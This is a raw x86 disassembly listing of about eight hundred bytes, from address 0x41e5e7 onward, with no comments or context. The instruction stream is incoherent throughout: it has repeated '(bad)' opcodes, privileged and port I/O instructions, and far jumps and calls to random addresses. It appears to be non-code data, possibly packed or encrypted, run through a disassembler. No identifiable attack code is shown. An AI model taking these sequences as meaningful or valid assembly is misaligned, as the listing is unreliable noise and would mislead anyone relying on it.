  41e5e7:	mov    DWORD PTR [ecx+ebx*4-0x40],ecx
  41e5eb:	pushf  
  41e5ec:	xchg   ebp,eax
  41e5ed:	leave  
  41e5ee:	xor    ebx,DWORD PTR ds:0x6b94d8f1
  41e5f4:	sti    
  41e5f5:	mov    WORD PTR [ebp+0x3c],gs
  41e5f8:	shr    BYTE PTR [ebx-0x7d],1
  41e5fb:	aas    
  41e5fc:	sti    
  41e5fd:	inc    esp
  41e5fe:	sub    al,0xbf
  41e600:	xchg   edx,eax
  41e601:	(bad)  
  41e602:	sahf   
  41e603:	xchg   edi,eax
  41e604:	ror    BYTE PTR [esp+edx*8],cl
  41e607:	sub    cl,ah
  41e609:	daa    
  41e60a:	cmp    eax,0x904f82cd
  41e60f:	fild   WORD PTR [edi-0x75c3edee]
  41e615:	inc    esi
  41e616:	stos   DWORD PTR es:[edi],eax
  41e617:	data16 shl BYTE PTR [eax+0x22f27b90],0x7c
  41e61f:	push   0x156dbb87
  41e624:	mov    bl,0x73
  41e626:	(bad)  
  41e62a:	hlt    
  41e62b:	or     esp,DWORD PTR [eax-0x52]
  41e62e:	(bad)  
  41e630:	pop    esp
  41e631:	(bad)  
  41e632:	jb     0x41e66a
  41e634:	fisttp WORD PTR [ecx+0x2a]
  41e637:	jo     0x41e66a
  41e639:	and    DWORD PTR [ecx+0x14],ebp
  41e63c:	fstp   QWORD PTR [esi]
  41e63e:	xor    al,0x84
  41e640:	loop   0x41e692
  41e642:	(bad)  
  41e644:	dec    esi
  41e645:	fucom  st(3)
  41e647:	mov    al,0x10
  41e649:	bound  esi,QWORD PTR [esi+0x72]
  41e64c:	shl    edx,1
  41e64e:	ret    0x910b
  41e651:	fst    QWORD PTR [edx-0x357d600a]
  41e657:	retf   0x1495
  41e65a:	scas   al,BYTE PTR es:[edi]
  41e65b:	sub    dl,BYTE PTR [eax]
  41e65d:	sbb    al,BYTE PTR [edx-0x4c]
  41e660:	(bad)  [esi]
  41e662:	jb     0x41e66a
  41e664:	test   DWORD PTR [ebx-0x3f],edi
  41e667:	jge    0x41e67c
  41e669:	nop
  41e66a:	lods   eax,DWORD PTR ds:[esi]
  41e66b:	jns    0x41e624
  41e66d:	jmp    0xb81f:0x577fad4b
  41e674:	cmp    dl,BYTE PTR [esi+ecx*2]
  41e677:	pop    ecx
  41e678:	nop
  41e679:	aam    0xf
  41e67b:	dec    esp
  41e67c:	mov    cl,0xb5
  41e67e:	push   ebp
  41e67f:	sbb    al,0x5d
  41e681:	jmp    0x41e666
  41e683:	sbb    eax,eax
  41e685:	adc    DWORD PTR [edi],esp
  41e687:	push   cs
  41e688:	jge    0x41e6dd
  41e68a:	mov    ebp,0xaed5c28e
  41e68f:	fstp   st(0)
  41e691:	(bad)  
  41e692:	dec    ebx
  41e693:	xchg   esp,eax
  41e694:	nop
  41e695:	jge    0x41e6ad
  41e697:	pop    esp
  41e698:	test   eax,0x5fce8ae8
  41e69d:	aaa    
  41e69e:	sbb    al,0x12
  41e6a0:	(bad)  
  41e6a2:	xchg   esp,edx
  41e6a4:	(bad)  [ecx+0xa]
  41e6a7:	push   ecx
  41e6a8:	xchg   edi,eax
  41e6a9:	cmp    BYTE PTR [ecx+0x5a73a36d],dh
  41e6af:	dec    ebx
  41e6b0:	inc    esi
  41e6b1:	ins    BYTE PTR es:[edi],dx
  41e6b2:	sbb    DWORD PTR [esi-0x3d87a8c4],0x66d14d69
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	retf   
  41e6be:	pop    ebp
  41e6bf:	sub    eax,0x45a0e61e
  41e6c4:	cs fs inc eax
  41e6c7:	lods   eax,DWORD PTR ds:[esi]
  41e6c8:	add    eax,0x2bbef674
  41e6cd:	enter  0x6685,0x9
  41e6d1:	inc    edi
  41e6d2:	je     0x41e749
  41e6d4:	lds    eax,FWORD PTR [esi+0x42]
  41e6d7:	jae    0x41e750
  41e6d9:	call   0xaf2f3590
  41e6de:	fisttp QWORD PTR [ecx+0x40aa79f3]
  41e6e4:	popa   
  41e6e5:	or     BYTE PTR [ecx-0x6d],al
  41e6e8:	imul   ecx,DWORD PTR [eax-0x3c],0xffffffce
  41e6ec:	mov    esi,0x86c74a64
  41e6f1:	jno    0x41e71e
  41e6f3:	mov    cs,WORD PTR [ebx+0x7a]
  41e6f6:	int    0x21
  41e6f8:	daa    
  41e6f9:	jecxz  0x41e6e8
  41e6fb:	scas   al,BYTE PTR es:[edi]
  41e6fc:	push   ebp
  41e6fd:	(bad)  
  41e6fe:	pop    ds
  41e6ff:	cmc    
  41e700:	add    eax,0x8d570736
  41e705:	xor    eax,0x582b98a6
  41e70a:	not    BYTE PTR [ebx-0x9]
  41e70d:	sti    
  41e70e:	push   esi
  41e70f:	out    0xd3,eax
  41e711:	pop    esi
  41e712:	scas   eax,DWORD PTR es:[edi]
  41e713:	pop    esp
  41e714:	cli    
  41e715:	fidivr DWORD PTR [ecx+0x41]
  41e718:	pop    eax
  41e719:	pusha  
  41e71a:	stos   BYTE PTR es:[edi],al
  41e71b:	push   0xd9a2a12b
  41e720:	sub    esi,DWORD PTR [esi-0xf]
  41e723:	daa    
  41e724:	inc    eax
  41e725:	rol    BYTE PTR [esi-0x5d],0xb1
  41e729:	adc    bl,BYTE PTR [edx]
  41e72b:	pop    ebp
  41e72c:	gs inc esi
  41e72e:	pop    edi
  41e72f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e730:	mov    dh,0xdb
  41e732:	lock pop esi
  41e734:	or     BYTE PTR [ebx+edx*2+0x3d59dddb],al
  41e73b:	outs   dx,DWORD PTR ds:[esi]
  41e73c:	push   es
  41e73d:	lock jae 0x41e6d5
  41e740:	fcmovnb st,st(6)
  41e742:	retf   
  41e743:	es mov edx,0xbf16b102
  41e749:	cdq    
  41e74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e74b:	int3   
  41e74c:	pop    ebx
  41e74d:	lahf   
  41e74e:	mov    ah,0x20
  41e750:	and    eax,DWORD PTR [esi]
  41e752:	adc    DWORD PTR [edx+0x7e],eax
  41e755:	and    DWORD PTR [ebx+0x54bbd669],edi
  41e75b:	or     al,ah
  41e75d:	jle    0x41e7a9
  41e75f:	pop    edi
  41e760:	mov    cl,0xcc
  41e762:	xor    DWORD PTR [ecx+0x54e8b7f2],eax
  41e768:	out    0xf0,eax
  41e76a:	or     eax,0xb092fec7
  41e76f:	cmp    edx,esp
  41e771:	enter  0x6b74,0x19
  41e775:	pusha  
  41e776:	xchg   BYTE PTR [edi-0x3dab7611],ch
  41e77c:	in     eax,dx
  41e77d:	lods   al,BYTE PTR ds:[esi]
  41e77e:	and    DWORD PTR [esi],edi
  41e780:	fs addr16 jle 0x41e782
  41e784:	mov    ch,0xc9
  41e786:	jg     0x41e74c
  41e788:	cmp    edi,DWORD PTR ss:[edi+0x15081c0e]
  41e78f:	shr    dh,cl
  41e791:	inc    ebx
  41e792:	xchg   DWORD PTR [ebp+ebx*1+0x5c],esi
  41e796:	loope  0x41e718
  41e798:	out    dx,al
  41e799:	xchg   ebp,eax
  41e79a:	test   DWORD PTR [ecx],ebx
  41e79c:	jmp    0x7834:0x88df2ada
  41e7a3:	fdiv   DWORD PTR [ebp-0x20]
  41e7a6:	mov    ecx,0x2b14a610
  41e7ab:	dec    edi
  41e7ac:	xlat   BYTE PTR ds:[ebx]
  41e7ad:	in     al,0xf1
  41e7af:	sub    BYTE PTR [eax+ebx*1-0x717dc6e6],ah
  41e7b6:	repz or al,0xea
  41e7b9:	imul   ebx,DWORD PTR [eax],0xfffffff3
  41e7bc:	addr16 mov al,ds:0xad85
  41e7c0:	in     al,dx
  41e7c1:	aas    
  41e7c2:	bswap  ecx
  41e7c4:	mov    ch,0x5e
  41e7c6:	fsubrp st(5),st
  41e7c8:	aaa    
  41e7c9:	dec    ebx
  41e7ca:	mov    ecx,0xce836225
  41e7cf:	cli    
  41e7d0:	xchg   ebp,eax
  41e7d1:	xchg   DWORD PTR ds:0x9cd98ccc,edi
  41e7d7:	inc    esi
  41e7d8:	ins    BYTE PTR es:[edi],dx
  41e7d9:	and    eax,DWORD PTR [edx+ecx*8]
  41e7dc:	scas   al,BYTE PTR es:[edi]
  41e7dd:	test   BYTE PTR [edx],dl
  41e7df:	push   ss
  41e7e0:	inc    esi
  41e7e1:	dec    edx
  41e7e2:	fcmovu st,st(6)
  41e7e4:	fisubr DWORD PTR ds:0xb3d74b52
  41e7ea:	outs   dx,DWORD PTR ds:[esi]
  41e7eb:	mov    edi,0xc32c1e29
  41e7f0:	popa   
  41e7f1:	dec    esp
  41e7f2:	or     DWORD PTR [esi],esp
  41e7f4:	push   es
  41e7f5:	sbb    DWORD PTR [ebx-0x2103fec5],esi
  41e7fb:	mov    ah,BYTE PTR [edi+ebx*4-0x26]
  41e7ff:	fisub  DWORD PTR [eax-0x289044db]
  41e805:	dec    eax
  41e806:	xor    esi,esp
  41e808:	xor    esp,esi
  41e80a:	and    esi,esp
  41e80c:	or     al,0x1d
  41e80e:	or     eax,0xa12972f8
  41e813:	test   al,0xcf
  41e815:	sbb    ebx,DWORD PTR [esi+0x2875ccb]
  41e81b:	out    dx,eax
  41e81c:	cld    
  41e81d:	ds push 0xffffff87
  41e820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e821:	jl     0x41e833
  41e823:	loope  0x41e80d
  41e825:	jo     0x41e860
  41e827:	inc    eax
  41e828:	mov    ah,BYTE PTR [eax]
  41e82a:	aad    0x19
  41e82c:	xchg   edi,eax
  41e82d:	loope  0x41e869
  41e82f:	ficom  WORD PTR [edx+ecx*1+0x1c]
  41e833:	ror    DWORD PTR [ecx+edx*1-0x39],cl
  41e837:	loopne 0x41e842
  41e839:	add    eax,0xc8b8eb70
  41e83e:	and    esp,esi
  41e840:	xchg   al,bl
  41e842:	cmp    eax,0x4e47226e
  41e847:	add    al,0x13
  41e849:	gs mov dl,0x39
  41e84c:	mov    DWORD PTR [ecx],esi
  41e84e:	xor    DWORD PTR [ecx],ebp
  41e850:	sub    dl,BYTE PTR [edi+0x5a]
  41e853:	loope  0x41e8c1
  41e855:	in     eax,0xe4
  41e857:	jmp    0x5ae93090
  41e85c:	sbb    ecx,esi
  41e85e:	lahf   
  41e85f:	sub    eax,0x1283f500
  41e864:	mov    BYTE PTR [ebx+edx*1],ah
  41e867:	clc    
  41e868:	push   ecx
  41e869:	dec    esi
  41e86a:	xchg   ecx,eax
  41e86b:	xlat   BYTE PTR ds:[ebx]
  41e86c:	push   eax
  41e86d:	lock or DWORD PTR [edx-0x20],esp
  41e871:	mov    esp,0xa16926a4
  41e876:	mov    edi,0xd60c7d23
  41e87b:	jno    0x41e897
  41e87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87e:	shl    DWORD PTR [esi+0x72],1
  41e881:	pusha  
  41e882:	arpl   WORD PTR [ecx],ax
  41e884:	push   ebx
  41e885:	fbld   TBYTE PTR [esi-0x4b542254]
  41e88b:	(bad)  
  41e88c:	fsub   QWORD PTR [ebp+ebx*8-0x4f14f721]
  41e893:	push   ebx
  41e894:	ss inc ecx
  41e896:	test   ah,0x1b
  41e899:	inc    DWORD PTR [eax+ebx*1+0xb847e14]
  41e8a0:	pop    ss
  41e8a1:	(bad)  
  41e8a2:	fst    st(0)
  41e8a4:	aam    0x2e
  41e8a6:	mov    ds:0x480b2d6b,al
  41e8ab:	jns    0x41e871
  41e8ad:	shl    DWORD PTR [ecx+0x2e59aed0],cl
  41e8b3:	sub    BYTE PTR [esi+0x31],dl
  41e8b6:	or     eax,0x1b1b3233
  41e8bb:	xor    eax,0x44ab26c6
  41e8c0:	int    0x7e
  41e8c2:	lea    ebx,[esi]
  41e8c4:	mov    esp,0x8c15b94
  41e8c9:	xlat   BYTE PTR ds:[ebx]
  41e8ca:	pop    ebx
  41e8cb:	aaa    
  41e8cc:	sbb    ebp,eax
  41e8ce:	pop    edx
  41e8cf:	mov    ecx,0xc0971ae9
  41e8d4:	mov    bl,0xc
  41e8d6:	(bad)  
  41e8d8:	mov    al,ds:0x42c114a8
  41e8dd:	jo     0x41e884
  41e8df:	xchg   ebp,eax
  41e8e0:	inc    DWORD PTR [ebx+0x3e]
  41e8e3:	gs fsub st,st(2)
  41e8e6:	and    BYTE PTR [esp+ebx*1-0x7f779b00],0x17
  41e8ee:	sub    al,0x2b
  41e8f0:	(bad)  
  41e8f1:	outs   dx,BYTE PTR ds:[esi]
  41e8f2:	xchg   esi,eax
  41e8f3:	aaa    
  41e8f4:	push   0x44cdfd62
  41e8f9:	and    ch,0x4a
  41e8fc:	outs   dx,BYTE PTR ds:[esi]
  41e8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8fe:	mov    ds:0xa7e6d76b,al
  41e903:	inc    esp
  41e904:	push   edi
  41e905:	fs dec esi
  41e907:	shr    DWORD PTR [edx+0x24da6e62],1
  41e90d:	or     dl,BYTE PTR [edx]
  41e90f:	sar    ebx,cl
  41e911:	add    BYTE PTR [ebx*1-0x5449680a],bh
  41e918:	sbb    al,0x34
  41e91a:	jns    0x41e944
  41e91c:	lock scas eax,DWORD PTR es:[edi]
  41e91e:	out    dx,eax
  41e91f:	cdq    
  41e920:	cmp    al,0xaa
  41e922:	sbb    DWORD PTR [ebx],esp
  41e924:	pop    esi
  41e925:	ret    
  41e926:	out    0x70,al
  41e928:	(bad)  
  41e929:	mov    ebp,0x196b43e3
  41e92e:	mov    ebp,0x227ae38
  41e933:	sbb    al,0xb6
  41e935:	call   0x98474b0c
  41e93a:	cs int3 
  41e93c:	inc    ebp
  41e93d:	in     eax,0x2d
  41e93f:	aad    0x94
  41e941:	ss sub al,0x70
  41e944:	stos   DWORD PTR es:[edi],eax
  41e945:	push   ds
  41e946:	inc    esi
  41e947:	retf   
  41e948:	hlt    
  41e949:	fcom   QWORD PTR [edx]
  41e94b:	push   esp
  41e94c:	push   esi
  41e94d:	sbb    al,0x44
  41e94f:	adc    BYTE PTR [eax-0x34],0xcd
  41e953:	jnp    0x41e99e
  41e955:	xchg   edi,eax
  41e956:	dec    ecx
  41e957:	addr16 mov ecx,0xa5768981
  41e95d:	pop    edx
  41e95e:	sub    ebx,DWORD PTR [edi+0x6ebff964]
  41e964:	push   0x58
  41e966:	test   DWORD PTR [ebx+edx*8],0xbd268544
  41e96d:	or     eax,0x9231e7ab
  41e972:	adc    BYTE PTR [esi+0x683499e],ah
  41e978:	lods   eax,DWORD PTR ds:[esi]
  41e979:	xchg   esi,eax
  41e97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e97b:	mov    al,ds:0x7e693928
  41e980:	add    DWORD PTR [esi+0x480d6a72],ebx
  41e986:	jl     0x41e92d
  41e988:	call   0x3ff62127
  41e98d:	lahf   
  41e98e:	sti    
  41e98f:	aam    0xd7
  41e991:	aas    
  41e992:	jns    0x41e98f
  41e994:	cli    
  41e995:	sar    BYTE PTR [edx-0x71],cl
  41e998:	ins    DWORD PTR es:[edi],dx
  41e999:	ret    0x7197
  41e99c:	jmp    0xeec2:0x2ab2f6c9
  41e9a3:	das    
  41e9a4:	call   0xc6023dc5
  41e9a9:	mov    edx,DWORD PTR [edi-0x468cb8a3]
  41e9af:	xchg   edx,eax
  41e9b0:	fcmove st,st(0)
  41e9b2:	cwde   
  41e9b3:	jb     0x41e981
  41e9b5:	jo     0x41e9a9
  41e9b7:	xchg   ebp,eax
  41e9b8:	loope  0x41ea14
  41e9ba:	jmp    0x41e9f0
  41e9bc:	stos   DWORD PTR es:[edi],eax
  41e9bd:	div    edi
  41e9bf:	adc    DWORD PTR ss:[esi+0x2f],esi
  41e9c3:	in     al,dx
  41e9c4:	sbb    al,0xe0
  41e9c6:	cdq    
  41e9c7:	or     edx,eax
  41e9c9:	push   ss
  41e9ca:	and    DWORD PTR [eax+0x14],ecx
  41e9cd:	jo     0x41ea0f
  41e9cf:	xchg   ecx,eax
  41e9d0:	add    eax,0xd790b690
  41e9d5:	push   ds
  41e9d6:	std    
  41e9d7:	dec    esi
  41e9d8:	cmp    edi,DWORD PTR [esi+edi*8]
  41e9db:	cld    
  41e9dc:	add    eax,0xf540e156
  41e9e1:	jnp    0x41ea42
  41e9e3:	mov    ds:0xdb2aa3a8,al
  41e9e8:	mov    al,0x79
  41e9ea:	js     0x41ea14
  41e9ec:	pop    ss
  41e9ed:	hlt    
  41e9ee:	iret   
  41e9ef:	add    ch,ch
  41e9f1:	outs   dx,BYTE PTR ds:[esi]
  41e9f2:	jae    0x41e97d
  41e9f4:	pop    ds
  41e9f5:	pop    esp
  41e9f6:	jae    0x41ea3c
  41e9f8:	inc    ebx
  41e9f9:	add    BYTE PTR [ebp-0x66],ch
  41e9fc:	aaa    
  41e9fd:	int    0x7
  41e9ff:	in     al,dx
  41ea00:	aaa    
  41ea01:	push   esp
  41ea02:	repnz test BYTE PTR [esi+0x1a],0x80
  41ea07:	or     al,ah
  41ea09:	sar    BYTE PTR [eax-0x7ff14bf],0x41
  41ea10:	pop    esi
  41ea11:	dec    esi
  41ea12:	icebp  
  41ea13:	jae    0x41ea38
  41ea15:	jo     0x41ea30
  41ea17:	test   al,0x5a
  41ea19:	sahf   
  41ea1a:	pop    edx
  41ea1b:	ror    BYTE PTR [eax],1
  41ea1d:	jnp    0x41e9cc
  41ea1f:	int3   
  41ea20:	fs out 0x88,al
  41ea23:	dec    ebx
  41ea24:	dec    esp
  41ea26:	mov    al,0xe4
  41ea28:	push   cs
  41ea29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea2a:	pop    ss
  41ea2b:	dec    ebx
  41ea2c:	into   
  41ea2d:	cmp    ah,BYTE PTR [ecx-0x64]
  41ea30:	push   edx
  41ea31:	pop    esi
  41ea32:	sahf   
  41ea33:	je     0x41ea15
  41ea35:	ja     0x41e9e5
  41ea37:	sbb    dh,BYTE PTR [eax-0x60]
  41ea3a:	xor    DWORD PTR [ebp-0x5c],ecx
  41ea3d:	pop    ds
  41ea3e:	or     eax,0xb8dd2968
  41ea43:	xchg   ecx,eax
  41ea44:	repnz push ebp
  41ea46:	xchg   ecx,eax
  41ea47:	cs pop ebp
  41ea49:	xchg   edi,eax
  41ea4a:	adc    ch,ah
  41ea4c:	xlat   BYTE PTR ds:[ebx]
  41ea4d:	repnz inc esp
  41ea4f:	das    
  41ea50:	mov    ss,ebp
  41ea52:	xchg   ebx,eax
  41ea53:	(bad)
  41ea57:	rcr    esi,1
  41ea59:	aas    
  41ea5a:	xchg   esp,esi
  41ea5c:	mov    eax,ds:0x4b7bbc03
  41ea61:	in     eax,0xa7
  41ea63:	xlat   BYTE PTR ds:[ebx]
  41ea64:	sub    bl,BYTE PTR [edi-0x108aa0ac]
  41ea6a:	fdivrp st(7),st
  41ea6c:	mov    dl,0xef
  41ea6e:	mov    edi,0x4601371e
  41ea73:	imul   esi,DWORD PTR [eax],0xffffffaa
  41ea76:	outs   dx,BYTE PTR ds:[esi]
  41ea77:	aaa    
  41ea78:	dec    ebp
  41ea79:	dec    ebx
  41ea7a:	les    edi,FWORD PTR [ecx]
  41ea7c:	sti    
  41ea7d:	cdq    
  41ea7e:	or     al,0x55
  41ea80:	std    
  41ea81:	hlt    
  41ea82:	xchg   ecx,eax
  41ea83:	or     eax,0xdfbfc0b1
  41ea88:	fisttp WORD PTR [esi+eax*4+0x2a3ef884]
  41ea8f:	and    dl,cl
  41ea91:	cmp    eax,0x6c37b4ac
  41ea96:	push   ecx
  41ea97:	sbb    bl,BYTE PTR [ecx]
  41ea99:	lds    ebp,FWORD PTR [ebx-0x476039]
  41ea9f:	test   DWORD PTR [eax-0xf],ecx
  41eaa2:	jnp    0x41eae8
  41eaa4:	dec    ebp
  41eaa5:	dec    ecx
  41eaa6:	jecxz  0x41ea51
  41eaa8:	pop    edi
  41eaa9:	sbb    BYTE PTR [ebx],0x48
  41eaac:	inc    edi
  41eaad:	aas    
  41eaae:	dec    esi
  41eaaf:	in     eax,0x51
  41eab1:	adc    bl,ah
  41eab3:	pshufw mm3,mm5,0xfc
  41eab7:	jmp    0x3193:0x9451db2d
  41eabe:	jbe    0x41ea4a
  41eac0:	mov    edi,ebp
  41eac2:	add    BYTE PTR [esi+edx*1-0x5e90590d],al
  41eac9:	dec    edi
  41eaca:	and    eax,0xbbd7449b
  41eacf:	aaa    
  41ead0:	jp     0x41ea58
  41ead2:	outs   dx,DWORD PTR ds:[esi]
  41ead3:	push   ebp
  41ead4:	inc    edx
  41ead5:	jmp    DWORD PTR [ecx]
  41ead7:	rol    al,1
  41ead9:	or     eax,0xfe21b9e5
  41eade:	stc    
  41eadf:	not    DWORD PTR [esi-0x48]
  41eae2:	inc    ebx
  41eae3:	popw   es
  41eae5:	sbb    ebp,DWORD PTR [esi+0x3c]
  41eae8:	push   0x4
  41eaea:	ins    BYTE PTR es:[edi],dx
  41eaeb:	cmp    al,0x82
  41eaed:	sub    eax,0x27a5730d
  41eaf2:	jmp    DWORD PTR [edi-0x46]
  41eaf5:	and    bh,BYTE PTR [edx+0x4414efb6]
  41eafb:	stc    
  41eafc:	and    al,BYTE PTR [esi+0x6f7d50f2]
  41eb02:	xor    bl,dh
  41eb04:	sti    
  41eb05:	xchg   bl,ch
  41eb07:	add    eax,0xfd85df0
  41eb0c:	inc    esp
  41eb0d:	int3   
  41eb0e:	cmp    eax,0x56e4c832
  41eb13:	shl    BYTE PTR [ebp-0x5e689f7],0x18
  41eb1a:	add    eax,edi
  41eb1c:	les    edx,FWORD PTR [esi+0xd]
  41eb1f:	and    edx,DWORD PTR [eax+0x41]
  41eb22:	cmp    BYTE PTR [ebp-0x1a99b852],ch
  41eb28:	stos   DWORD PTR es:[edi],eax
  41eb29:	xor    bl,BYTE PTR [edx+0x4d]
  41eb2c:	xchg   edi,eax
  41eb2d:	mov    ch,0x59
  41eb2f:	xchg   esp,eax
  41eb30:	push   ebp
  41eb31:	push   ebp
  41eb32:	cmp    BYTE PTR [eax-0x71],dh
  41eb35:	cmp    eax,0x49c85433
  41eb3a:	int3   
  41eb3b:	jp     0x41ebb3
  41eb3d:	(bad)  
  41eb3f:	mov    cl,0xac
  41eb41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb42:	arpl   sp,ax
  41eb44:	sbb    ecx,esi
  41eb46:	(bad)  
  41eb47:	push   cs
  41eb48:	shl    BYTE PTR [ebp-0x75],cl
  41eb4b:	les    edx,FWORD PTR [ebp-0x55]
  41eb4e:	cwde   
  41eb4f:	aam    0x6c
  41eb51:	sbb    al,0xd0
  41eb53:	scas   al,BYTE PTR es:[edi]
  41eb54:	lahf   
  41eb55:	dec    edx
  41eb56:	mov    dh,0x83
  41eb58:	cmp    dl,BYTE PTR [ecx+esi*1]
  41eb5b:	cli    
  41eb5c:	out    0x80,al
  41eb5e:	sbb    ch,bh
  41eb60:	aad    0xf
  41eb62:	sar    DWORD PTR [ebx],1
  41eb64:	jmp    0x41eb70
  41eb66:	clc    
  41eb67:	add    eax,0x153b1ebf
  41eb6c:	pop    ecx
  41eb6d:	inc    eax
  41eb6e:	lods   eax,DWORD PTR ds:[esi]
  41eb6f:	loope  0x41ebd1
  41eb71:	mov    dl,0x53
  41eb73:	pop    ds
  41eb74:	inc    esi
  41eb75:	sub    al,0x58
  41eb77:	sti    
  41eb78:	ret    
  41eb79:	(bad)  
  41eb7a:	mov    bh,0xcd
  41eb7c:	push   eax
  41eb7d:	jmp    0x41eb8c
  41eb7f:	ins    BYTE PTR es:[edi],dx
  41eb80:	mov    al,0x91
  41eb82:	fistp  QWORD PTR [edi]
  41eb84:	mov    ebp,0x1df7ec5e
  41eb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb8a:	outs   dx,DWORD PTR ds:[esi]
  41eb8b:	idiv   BYTE PTR [edi+0x17c40df9]
  41eb91:	xor    al,0xbf
  41eb93:	dec    eax
  41eb94:	test   DWORD PTR [ebx],esp
  41eb96:	adc    ch,0x3e
  41eb99:	mov    ebx,0xfd28815d
  41eb9e:	cmp    BYTE PTR [ebp+0x7b5e1812],0x33
  41eba5:	fimul  DWORD PTR [esi+0x4da0f430]
  41ebab:	aas    
  41ebac:	jmp    0x2e73:0x4ea30911
  41ebb3:	into   
  41ebb4:	call   0x267a:0x963fe47a
  41ebbb:	push   esp
  41ebbc:	mov    esp,0x1666f36a
  41ebc1:	lods   eax,DWORD PTR ds:[esi]
  41ebc2:	pop    ds
  41ebc3:	in     al,0x41
  41ebc5:	(bad)
  41ebc8:	xor    BYTE PTR [ecx+0x2aebb47e],bh
  41ebce:	daa    
  41ebcf:	(bad)  
  41ebd0:	push   ebp
  41ebd1:	cmp    BYTE PTR [esi-0x60],0xaf
  41ebd5:	push   ecx
  41ebd6:	sub    DWORD PTR fs:[esi-0x66],edx
  41ebda:	push   ecx
  41ebdb:	iret   
  41ebdc:	mov    edx,0x76296f7e
  41ebe1:	fnsave [edx-0x7194cb07]
  41ebe7:	scas   eax,DWORD PTR es:[edi]
  41ebe8:	out    dx,eax
  41ebe9:	jmp    0x222b:0x66dc4a5a
  41ebf0:	in     eax,dx
  41ebf1:	jo     0x41eb82
  41ebf3:	sahf   
  41ebf4:	mov    edi,0x331a1a20
  41ebf9:	mov    ecx,0x87c57dd6
  41ebfe:	int    0x59
  41ec00:	inc    ebx
  41ec01:	sub    dl,BYTE PTR [ecx]
  41ec03:	into   
  41ec04:	jno    0x41eba7
  41ec06:	not    DWORD PTR [ebx]
  41ec08:	push   eax
  41ec09:	inc    edx
  41ec0a:	jecxz  0x41ec26
  41ec0c:	pop    ebp
  41ec0d:	inc    ecx
  41ec0e:	add    eax,0x920b400b
  41ec13:	xchg   edi,eax
  41ec14:	mov    al,0xef
  41ec16:	cdq    
  41ec17:	mov    esi,0x94061994
  41ec1c:	sub    bh,BYTE PTR [ebp+0x42218a27]
  41ec22:	xchg   edi,eax
  41ec23:	mov    BYTE PTR [ebx],bh
  41ec25:	call   0x10dd8731
  41ec2a:	aad    0x41
  41ec2c:	add    eax,0xccab8e50
  41ec31:	pop    esi
  41ec32:	sub    eax,0x741419f7
  41ec37:	test   BYTE PTR ds:0xde8b0ad0,0x34
  41ec3e:	push   ecx
  41ec3f:	outs   dx,DWORD PTR ds:[esi]
  41ec40:	or     eax,eax
  41ec42:	push   ebx
  41ec43:	cmp    eax,0x9f4d80cf
  41ec48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec49:	jp     0x41ec3f
  41ec4b:	xchg   BYTE PTR [edx+0x788699ed],cl
  41ec51:	popa   
  41ec52:	cmp    eax,0xf3f45ebe
  41ec57:	out    dx,eax
  41ec58:	es xor al,0x99
  41ec5b:	add    al,0xa7
  41ec5d:	sahf   
  41ec5e:	push   esp
  41ec5f:	icebp  
  41ec60:	leave  
  41ec61:	pop    ss
  41ec62:	loop   0x41ec55
  41ec64:	or     edi,ebp
  41ec66:	sbb    ecx,ecx
  41ec68:	int3   
  41ec69:	cld    
  41ec6a:	nop
  41ec6b:	inc    edi
  41ec6c:	add    BYTE PTR [ecx-0x4916ea2c],al
  41ec72:	add    BYTE PTR [eax],cl
  41ec74:	push   edi
  41ec75:	or     al,BYTE PTR [edx]
  41ec77:	mov    esp,0x44663211
  41ec7c:	fsub   st,st(5)
  41ec7e:	add    BYTE PTR [edi+eax*4-0x76991992],dl
  41ec85:	sub    ch,cl
  41ec87:	mov    ah,BYTE PTR [ebx+ebp*8+0x57]
  41ec8b:	sbb    bh,BYTE PTR [ebp-0x5aa5da5c]
  41ec91:	sar    DWORD PTR [eax+0x38462627],1
  41ec97:	imul   ebx,edx,0x36
  41ec9a:	mov    DWORD PTR [ebp+0x5ac72ccc],edx
  41eca0:	mov    dl,BYTE PTR [esi-0x22ef43c]
  41eca6:	rol    DWORD PTR [ebx+edx*1+0x3e],1
  41ecaa:	pop    esi
  41ecab:	out    dx,eax
  41ecac:	mov    eax,ds:0x224dd67b
  41ecb1:	push   ebx
  41ecb2:	arpl   WORD PTR [esi-0x65],si
  41ecb5:	mov    ecx,0xd41addb7
  41ecba:	inc    edx
  41ecbb:	or     dl,BYTE PTR [ebx+ecx*1-0x102642f3]
  41ecc2:	scas   eax,DWORD PTR es:[edi]
  41ecc3:	lds    edi,FWORD PTR [esp+esi*1]
  41ecc6:	pop    ebx
  41ecc7:	sbb    bl,BYTE PTR [ebx-0x2f4266ad]
  41eccd:	or     BYTE PTR [ebx-0x33],dh
  41ecd0:	xchg   DWORD PTR [edx],edx
  41ecd2:	pcmpeqw mm7,QWORD PTR [ebx-0x41]
  41ecd6:	out    0xf6,al
  41ecd8:	ins    BYTE PTR es:[edi],dx
  41ecd9:	fwait
  41ecda:	dec    edx
  41ecdb:	inc    ecx
  41ecdc:	cs mov dl,0xa3
  41ecdf:	sbb    BYTE PTR [eax-0x3b3bb14f],0x7e
  41ece6:	jo     0x41ecc8
  41ece8:	or     ebp,DWORD PTR [esi]
  41ecea:	adc    eax,0x3338cbde
  41ecef:	fwait
  41ecf0:	inc    BYTE PTR [edx-0x53]
  41ecf3:	lods   eax,DWORD PTR ds:[esi]
  41ecf4:	or     al,0x89
  41ecf6:	or     DWORD PTR [eax],edx
  41ecf8:	cmp    dl,bl
  41ecfa:	jecxz  0x41ecb2
  41ecfc:	dec    edi
  41ecfd:	dec    esi
  41ecfe:	fucom  st(7)
  41ed00:	jb     0x41ec8f
  41ed02:	sub    BYTE PTR [eax-0x19],dh
  41ed05:	out    0xa4,al
  41ed07:	push   ebp
  41ed08:	sbb    ch,BYTE PTR [edi]
  41ed0a:	sbb    DWORD PTR [ebx],0x98e839d1
  41ed10:	cmc    
  41ed11:	adc    eax,0xdae58161
